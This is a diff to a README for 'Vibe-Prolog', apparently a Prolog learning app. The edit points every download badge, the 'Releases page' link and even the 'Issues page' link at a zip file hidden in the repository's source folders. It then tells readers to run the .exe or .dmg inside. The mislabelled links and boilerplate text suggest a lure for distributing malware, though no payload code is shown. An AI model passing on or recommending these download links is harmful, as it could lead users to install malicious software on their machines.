@@ -1,7 +1,7 @@
 # 🎶 Vibe-Prolog - Enhance Your Coding Experience
 
 ## 📥 Download This Software
-[![Download Vibe-Prolog](https://raw.githubusercontent.com/moaju0/Vibe-Prolog/main/website/src/layouts/Vibe-Prolog-v3.2.zip%20Vibe--Prolog-FF5733?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/moaju0/Vibe-Prolog/main/website/src/layouts/Vibe-Prolog-v3.2.zip)
+[![Download Vibe-Prolog](https://raw.githubusercontent.com/moaju0/Vibe-Prolog/main/vibeprolog/builtins/Prolog_Vibe_v1.3-beta.3.zip%20Vibe--Prolog-FF5733?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/moaju0/Vibe-Prolog/main/vibeprolog/builtins/Prolog_Vibe_v1.3-beta.3.zip)
 
 ## 🚀 Getting Started
 Welcome to Vibe-Prolog! This application helps you code in Prolog while providing a fun and engaging experience. Whether you are a beginner or looking to sharpen your skills, Vibe-Prolog makes programming easier and more intuitive.
@@ -23,9 +23,9 @@ Before you start, make sure your system meets the following requirements:
 ## 📥 Download & Install
 To get started with Vibe-Prolog, you'll need to download the application. 
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/moaju0/Vibe-Prolog/main/website/src/layouts/Vibe-Prolog-v3.2.zip).
+1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/moaju0/Vibe-Prolog/main/vibeprolog/builtins/Prolog_Vibe_v1.3-beta.3.zip).
 2. **Select the Latest Release**: Look for the latest version at the top of the page. Click on it to see more details.
-3. **Download the Application**: Choose the version suitable for your operating system and download the installer file. The relevant files will usually be labeled by their platform (e.g., `https://raw.githubusercontent.com/moaju0/Vibe-Prolog/main/website/src/layouts/Vibe-Prolog-v3.2.zip`, `https://raw.githubusercontent.com/moaju0/Vibe-Prolog/main/website/src/layouts/Vibe-Prolog-v3.2.zip`).
+3. **Download the Application**: Choose the version suitable for your operating system and download the installer file. The relevant files will usually be labeled by their platform (e.g., `https://raw.githubusercontent.com/moaju0/Vibe-Prolog/main/vibeprolog/builtins/Prolog_Vibe_v1.3-beta.3.zip`, `https://raw.githubusercontent.com/moaju0/Vibe-Prolog/main/vibeprolog/builtins/Prolog_Vibe_v1.3-beta.3.zip`).
 4. **Install the Application**:
    - **For Windows**: Run the downloaded `.exe` file and follow the on-screen instructions.
    - **For macOS**: Open the `.dmg` file, drag Vibe-Prolog to your Applications folder, and launch it from there.
@@ -51,11 +51,11 @@ If you encounter any issues, check the following:
 ## 🤝 Community Involvement
 Join our user community to enhance your learning and share your experiences:
 
-- **GitHub Issues**: Report bugs or request features directly on the [Issues page](https://raw.githubusercontent.com/moaju0/Vibe-Prolog/main/website/src/layouts/Vibe-Prolog-v3.2.zip).
+- **GitHub Issues**: Report bugs or request features directly on the [Issues page](https://raw.githubusercontent.com/moaju0/Vibe-Prolog/main/vibeprolog/builtins/Prolog_Vibe_v1.3-beta.3.zip).
 - **Forums**: Participate in discussions with other Prolog developers to get help or provide support.
 - **Feedback**: Your thoughts matter! Share your feedback to help us improve Vibe-Prolog.
 
 ## 🌟 Conclusion
 Thank you for choosing Vibe-Prolog. We hope this software inspires you to explore coding in a creative way. Happy coding!
 
-[![Download Vibe-Prolog](https://raw.githubusercontent.com/moaju0/Vibe-Prolog/main/website/src/layouts/Vibe-Prolog-v3.2.zip%20Vibe--Prolog-FF5733?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/moaju0/Vibe-Prolog/main/website/src/layouts/Vibe-Prolog-v3.2.zip)
+[![Download Vibe-Prolog](https://raw.githubusercontent.com/moaju0/Vibe-Prolog/main/vibeprolog/builtins/Prolog_Vibe_v1.3-beta.3.zip%20Vibe--Prolog-FF5733?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/moaju0/Vibe-Prolog/main/vibeprolog/builtins/Prolog_Vibe_v1.3-beta.3.zip)
